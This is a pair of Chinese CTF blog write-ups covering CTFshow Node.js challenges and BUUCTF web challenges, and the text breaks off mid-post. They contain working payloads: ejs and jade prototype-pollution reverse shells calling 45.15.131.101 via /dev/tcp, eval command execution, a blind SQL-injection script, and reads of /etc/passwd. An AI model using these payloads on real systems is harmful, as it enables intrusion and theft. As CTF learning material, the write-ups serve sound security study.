[{"title":"CTFshowNodejs","url":"/posts/56040919.html","content":"\n# nodejs\n\n首先要知道nodejs是啥，其实就是javascript的后端版本\n\n一些有的没的的入门知识\n\n[nodejs一些入门特性&&实战](https://xz.aliyun.com/t/7752#toc-5)\n\n**nodejs调用系统命令的方式**\n\n如果你要是使用nodejs，你需要调用引用`child_process`模块：\n\n```js\nvar exec = require('child_process').exec;\nvar cmd = 'prince -v builds/pdf/book.html -o builds/pdf/book.pdf';\n\nexec(cmd, function(error, stdout, stderr) {\n  // 获取命令执行的输出\n});\n```\n\n这里使用的是`child_process.exec`来在nodejs程序里执行系统命令。如果你想在shell里执行命令并且要处理命令输出的I/O数据流，输出的体积比较大的话，我们需要使用`child_process.spawn`：\n\n```js\nvar spawn = require('child_process').spawn;\nvar child = spawn('prince', [\n  '-v', 'builds/pdf/book.html',\n  '-o', 'builds/pdf/book.pdf'\n]);\n\nchild.stdout.on('data', function(chunk) {\n  // output will be here in chunks\n});\n\n// or if you want to send output elsewhere\nchild.stdout.pipe(dest);\n```\n\n如果你想在nodejs里执行的是一个文件，而不是一个简单的命令，那你就需要使用`child_process.execFile`，这个方法的参数几乎和`spawn`一样，只是多了第四个回调函数参数，和`exec`里的回调函数参数一样：\n\n```js\nvar execFile = require('child_process').execFile;\nexecFile(file, args, options, function(error, stdout, stderr) {\n  // command output is in stdout\n});\n```\n\n上面的这些方法在nodejs里都是异步执行的，到但有时候我们需要同步执行一些任务，下面的一些代码例子是使用同步的方法调用系统命令执行任务：\n\n```js\n'use strict';\n\nconst\n    spawn = require( 'child_process' ).spawnSync,\n    ls = spawn( 'ls', [ '-lh', '/usr' ] );\n\nconsole.log( `stderr: ${ls.stderr.toString()}` );\nconsole.log( `stdout: ${ls.stdout.toString()}` );\nconst execSync = require('child_process').execSync;\n\nvar cmd = execSync('prince -v builds/pdf/book.html -o builds/pdf/book.pdf');\n```\n\n简单来说，调用系统命令传入的方法是\n\n\n\n在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。\n\n\n\n\n\n\n\n\n\n**334**\n\n```javascript\nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n直接小写就行`ctfshow+123456`\n\n**335**\n\n看源代码发现eval参数，尝试传入ls回显未找到文件，传入1+1回显2，怀疑执行了nodejs中的eval函数\n\n> 在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。\n\n构造一个系统命令执行的payload\n\n```javascript\nrequire(\"child_process\").execSync('ls')\n```\n\n拿到文件名直接cat就行\n\n**336**\n\n同上题不过增加了过滤\n\n换一个方法\n\n```javascript\nrequire('child_process').spawnSync('ls', []).stdout.toString()\n```\n\n**337**\n\n源码在此\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\n  \tres.end(flag);\n  }else{\n  \tres.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n```\n\n要求就是传入的ab长度相等，内容不想等，加上flag字符串变量后md5运算的结果相同\n\n> 在javascript中加法的规则很简单，只能数字与数字相加或字符串和字符串相加；所有其他类型的值都会自动转换成这两个类型的值。而对象类型经过toString转换后结果为[object Object]字符串\n\n所以最终传入两个数组即可\n\n```\npayload:?a[x]=1&b[x]=2\n```\n\n为啥数组的键值不能是数字\n\n```\na={'x':'1'}\nb={'x':'2'}\n\nconsole.log(a+\"flag{xxx}\")\nconsole.log(b+\"flag{xxx}\")\n二者得出的结果都是[object Object]flag{xxx}，所以md5值也相同\n\n但是如果传a[0]=1&b[0]=2，相当于创了个变量a=[1] b=[2]，再像上面那样打印的时候，会打印出1flag{xxx}和2flag{xxx}\n```\n\n**338**\n\n原型链污染\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n`utils.copy(user,req.body);`这个和merge差不多\n\n```\npayload:\nPOST\n{\"__proto__\":{\"ctfshow\":\"36dboy\"}}\n```\n\n**339**\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\nfunction User(){\n  this.username='';\n  this.password='';\n}\nfunction normalUser(){\n  this.user\n}\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow===flag){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n});\nmodule.exports = router;\n```\n\n这要让ctfshow=flag变量，我不行捏，看看旁边的app.js\n\n```javascript\n//api.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  res.render('api', { query: Function(query)(query)});\n});\nmodule.exports = router;\n```\n\n- Function(\"console.log('HelloWolrd')\")()\n\n类似于php中的create_function\n\n对于ejs渲染引擎来说，对opts有原型链污染漏洞\n\n```javascript\nif (opts.outputFunctionName) {\n        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\\n';\n}\n```\n\n这里我们就可以污染outputFunctionName来执行恶意代码\n\n```js\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}\n```\n\n通过login污染再通过api渲染调用\n\n**340**\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var user = new function(){\n    this.userinfo = new function(){\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    };\n  }\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin){\n   res.end(flag);\n  }else{\n   return res.json({ret_code: 2, ret_msg: '登录失败'});  \n  }\n});\nmodule.exports = router;\n```\n\n这里要向上污染两层才行，其他的都和上面一样\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**341**\n\n没有api了，直接ejs的rce\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**342，343**\n\n不是ejs渲染模版了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png)\n\n是jade渲染模版，找jade的原型链污染rce\n\n```json\n{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"')\"}}}\n```\n\n**344**\n\n源码\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n  \tres.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n  \tres.end(flag);\n  }else{\n  \tres.end('where is flag. :)');\n  }\n});\n```\n\n根据源码我们正常情况下需要传`?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true}`但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。\n\n```\npayload:?query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}\n```\n\nnodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。\n"},{"title":"BUUCTF记录2","url":"/posts/210d3ac7.html","content":"\n## [ISITDTU 2019]EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosé will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\n`strlen(count_chars(strtolower($_), 0x3)) > 0xd`\n\n先看这个判断，count_chars函数用法如下\n\n| 参数     | 描述                                                         |\n| :------- | :----------------------------------------------------------- |\n| *string* | 必需。规定要检查的字符串。                                   |\n| *mode*   | 可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符 |\n\n那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息\n\n```\n?.=(~%8F%97%8F%96%91%99%90)();\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26 15.30.06.png)\n\n可以使用scandir来扫描文件，构建payload：`print_r(scandir('.'))`\n\n使用异或脚本生成\n\n```python\nstr=\"print_r\"\nfor i in str:\n    print(hex(int(hex(ord(i)),16) ^ 0xff),end='')\n```\n\n生成的payload如下\n\n```\n?.=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); \n```\n\n但是此时我们发现超过了13个不同字符的限制，所以我们需要通过异或缩减原始字符数量\n\n```python\nnow ='\\'().;_acdinprst'\nfor i in now :\n    for j in now:\n        for k in now :\n            for m in now :\n                if ord(j)^ord(k)^ord(m) == ord(i):\n                    if(j==k or j==m or m==k ):\n                        continue\n                    else :\n                        print(i+'=='+j + '^'+ k +'^'+m)\n```\n\n结果中可供替换的字符有很多，挑出三个好用的\n\n```\nt = s^c^d\ns^0xff=0x8c\nc^0xff=0x9c \nd^0xff=0x9b\nn = i^c^d\ni^0xff=0x96\nc^0xff=0x9c\nd^0xff=0x9b\nr = a^c^p\na^0xff=0x9e\nc^0xff=0x9c\np^0xff=0x8f\n```\n\n最终异或时候将不需要异或的字符串异或0xFF两次即可\n\n```\nprint_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))\nscandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))\n最终payload：?.=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));\n```\n\n获得文件名，尝试访问发现没有权限，只能使用函数读取`readfile(end(scandir('.')))`\n\n```\nArray ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n```\n\n真·最终payload\n\n```\n?.=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));\n```\n\n## [GYCTF2020]Ez_Express\n\n本题触及知识盲区，乖乖学习node.js去咯\n\n首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的[node.js相关安全问题总结](https://www.cnblogs.com/20175211lyz/p/12659738.html)，然后就是这道题了，是node.js的原型链污染\n\n**node.js的原型链污染**\n\n在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\nnew Foo()\n```\n\n类中的方法也同样可以写在构造函数内\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n    this.show = function() {\n        console.log(this.bar)\n    }\n}\n(new Foo()).show()\n```\n\n但是这么写的问题是，我们每新建一个Foo对象时，this.show函数就会执行一次，也就是说，show方法实际上是被绑定在对象上而不是该对象的“类”上。而我们希望在创建类的时候只创建一次show方法，此时我们就需要使用原型(`prototype`)了\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\n\nFoo.prototype.show = function show() {\n    console.log(this.bar)\n}\n\nlet foo = new Foo()\nfoo.show()\n```\n\n我们可以认为原型`prototype`是类`Foo`的一个属性，而所有用`Foo`类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的`foo`对象，其天生就具有`foo.show()`方法。\n\n我们可以通过`Foo.prototype`来访问`Foo`类的原型，但`Foo`实例化出来的对象，是不能通过prototype访问原型的。这时候，就该`__proto__`登场了。\n\n一个Foo类实例化出来的foo对象，可以通过`foo.__proto__`属性来访问Foo类的原型，也就是说：\n\n```javascript\nfoo.__proto__ == Foo.prototype\n```\n\n所以\n\n1. `prototype`是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`中的属性和方法\n2. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性\n3. 所有类对象在实例化的时候将会拥有`prototype`中的属性和方法，这个特性被用来实现JavaScript中的继承机制\n\n那么问题就出在对于js来说，万物皆对象，只要我们不断的向上访问`__proto__`属性，再对其中的某个属性进行修改，总能找到相对于我们需要修改的类的父类，此时再新建我们需要修改的类时就自动带上了我们修改的内容\n\n以上全是知识，正式开始做题\n\n首先就是这个\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png)\n\n用admın经过`toUpperCase`处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容\n\n```javascript\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n```\n\n再加上上面的clone方法\n\n```javascript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n\n此时我们向/action中传入json编码后的payload\n\n```\nPOST:\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"}}\n```\n\n再访问info即可获取flag\n\n## [安洵杯 2019]不是文件上传\n\n传文件，试后缀，扫目录都不行，看源码\n\n```php\n<?php\nclass helper {\n\tprotected $folder = \"pic/\";\n\tprotected $ifview = False; \n\tprotected $config = \"config.txt\";\n\t// The function is not yet perfect, it is not open yet.\n\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n\n\tpublic function getfile($input)\n\t{\n\t\tif(isset($input)){\n\t\t\t$rs = $this->check($_FILES[$input]);\n\t\t}\n\t\treturn $rs;\n\t}\n\n\tpublic function check($info)\n\t{\n\t\t$basename = substr(md5(time().uniqid()),9,16);\n\t\t$filename = $info[\"name\"];\n\t\t$ext = substr(strrchr($filename, '.'), 1);\n\t\t$cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\");\n\t\tif(!in_array($ext,$cate_exts)){\n\t\t\tdie(\"<p>Please upload the correct image file!!!</p>\");\n\t\t}\n\t    $title = str_replace(\".\".$ext,'',$filename);\n\t    return array('title'=>$title,'filename'=>$basename.\".\".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.\".\".$ext);\n\t}\n\n\tpublic function save($data)\n\t{\n\t\tif(!$data || !is_array($data)){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\t$id = $this->insert_array($data);\n\t\treturn $id;\n\t}\n\n\tpublic function insert_array($data)\n\t{\t\n\t\t$con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($con)) \n\t\t{ \n\t\t    die(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t\t$sql_fields = array();\n\t\t$sql_val = array();\n\t\tforeach($data as $key=>$value){\n\t\t\t$key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key);\n\t\t\t$value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value);\n\t\t\t$sql_fields[] = \"`\".$key_temp.\"`\";\n\t\t\t$sql_val[] = \"'\".$value_temp.\"'\";\n\t\t}\n\t\t$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";\n\t\tmysqli_query($con, $sql);\n\t\t$id = mysqli_insert_id($con);\n\t\tmysqli_close($con);\n\t\treturn $id;\n\t}\n\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n\n\tfunction __destruct(){\n\t\t# Read some config html\n\t\t$this->view_files($this->config);\n\t}\n}\n\n?>\n```\n\n```php\n//upload.php\ninclude(\"./helper.php\");\nclass upload extends helper {\n\tpublic function upload_base(){\n\t\t$this->upload();\n\t}\n}\n\nif ($_FILES){\n\tif ($_FILES[\"file\"][\"error\"]){\n\t\tdie(\"Upload file failed.\");\n\t}else{\n\t\t$file = new upload();\n\t\t$file->upload_base();\n\t}\n}\n\n$a = new helper();\n```\n\n```php\n//show.php\ninclude(\"./helper.php\");\n$show = new show();\nif($_GET[\"delete_all\"]){\n\tif($_GET[\"delete_all\"] == \"true\"){\n\t\t$show->Delete_All_Images();\n\t}\n}\n$show->Get_All_Images();\n\nclass show{\n\tpublic $con;\n\n\tpublic function __construct(){\n\t\t$this->con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($this->con)){ \n   \t\t\tdie(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t}\n\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}else{\n\t\t    echo \"<p>You have not uploaded an image yet.</p>\";\n\t\t}\n\t\tmysqli_close($this->con);\n\t}\n\n\tpublic function Delete_All_Images(){\n\t\t$sql = \"DELETE FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t}\n}\n?>\n```\n\n找到可供利用的方法\n\n```php\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n```\n\n反序列化的方法\n\n```php\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}\n```\n\n序列化的方法\n\n```php\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n```\n\n首先构造helper类\n\n```php\n<?php\nclass helper\n{\n    protected $ifview=true;\n    protected $config=\"/flag\";\n}\n$a = new helper();\necho serialize($a);\necho bin2hex(serialize($a));\n?>\n//O:6:\"helper\":2:{s:9:\"\u0000*\u0000ifview\";b:1;s:9:\"\u0000*\u0000config\";s:5:\"/flag\";}\n```\n\n题目中会将序列化后的\\0*\\0转为\\0\\0\\0再存入数据库并且在取出是逆向使用，其实对于我们的注入没有任何影响\n\n然后查看sql语句构造方法`$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";`在该方法中，我们可以使用#截断来注释掉后面内容，在文件名处构造payload进行sql注入，而\\0字符不显示，使用16进制编码来将字符串注入\n\n```\npayload：\n文件名：\n1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg\n```\n\n## [极客大挑战 2020]Roamphp1-Welcome\n\n405换POST，`roam1[]=1&roam2[]=2`\n\n## [RoarCTF 2019]Online Proxy\n\n看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用`1' or '1`进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句\n\n```\n0' or if() or '0\n```\n\n这样在结果正确时就会返回1\n\n语句的执行顺序是\n\n1、读取IP，并且回显到Current IP位置\n\n2、传入任意不同IP，此时Last IP中的语句被写入数据库\n\n3、传入第二次访问的IP，此时由于与上次访问IP相同，会从数据库中取出注入的语句并且执行回显，完成注入\n\n构造~~偷~~脚本\n\n```python\n# coding:utf-8 \nimport requests\nimport time\nurl = 'http://node3.buuoj.cn:25869/'\n\nres = ''\nfor i in range(1,200):\n    print(i)\n    left = 31\n    right = 127\n    mid = left + ((right - left)>>1)\n    while left < right:\n        #payload = \"0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),{},1))>{}) or '0\".format(i,mid)\n        payload = \"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))>{}) or '0\".format(i,mid)\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    } \n        r = requests.post(url = url, headers = headers)\n\n\n        if r.status_code == 429:\n            print('too fast')\n            time.sleep(2)\n        if 'Last Ip: 1'  in r.text:\n            left = mid + 1\n        elif 'Last Ip: 1' not in r.text:\n            right = mid \n        mid = left + ((right-left)>>1)\n    if mid == 31 or mid == 127:\n        break\n    res += chr(mid)\n    print(str(mid),res)\n    time.sleep(1)\n#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e\n#F4l9_t4b1e\n#F4l9_C01uMn\n```\n\n## [HarekazeCTF2019]Avatar Uploader 1\n\n传图片马不通过估计是因为`getimagesize`没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯\n\n```php\n<?php\nerror_reporting(0);\n\nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n\n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n\n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n  error('No file was uploaded.');\n}\n\n// check file size\nif ($_FILES['file']['size'] > 256000) {\n  error('Uploaded file is too large.');\n}\n\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n  error('Uploaded file is not PNG format.');\n}\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n  error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n  // I hope this never happens...\n  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n\n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n\n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\n可以看到`if ($size[2] !== IMAGETYPE_PNG)`成立的话就会输出flag\n\ngetimagesize返回结果说明\n\n- 索引 0 给出的是图像宽度的像素值\n- 索引 1 给出的是图像高度的像素值\n- 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM\n- 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签\n- 索引 bits 给出的是图像的每种颜色的位数，二进制格式\n- 索引 channels 给出的是图像的通道值，RGB 图像默认是 3\n- 索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(\"Content-type: image/jpeg\");\n\n所以我们现在需要的条件是：\n\n1、文件经过`finfo_file`方法检测到的是PNG图片\n\n2、getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3\n\n`finfo_file`方法是通过检测文件头的十六进制信息来判断文件类型的，那么我们一点点删除直到`finfo_file`能读出类型而`getimagesize`读不出内容即可\n\n## [CISCN2019 华东南赛区]Web4\n\nRead Something，传参读文件试试`/etc/passwd`读到了，那再读读环境文件吧`/proc/self/environ`，看到python文件位置，读源码\n\n```python\n# encoding:utf-8\nimport re, random, uuid, urllib\nfrom flask import Flask, session, request\n\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = True\n\n@app.route('/')\ndef index():\n    session['username'] = 'www-data'\n    return 'Hello World! <a href=\"/read?url=https://baidu.com\">Read 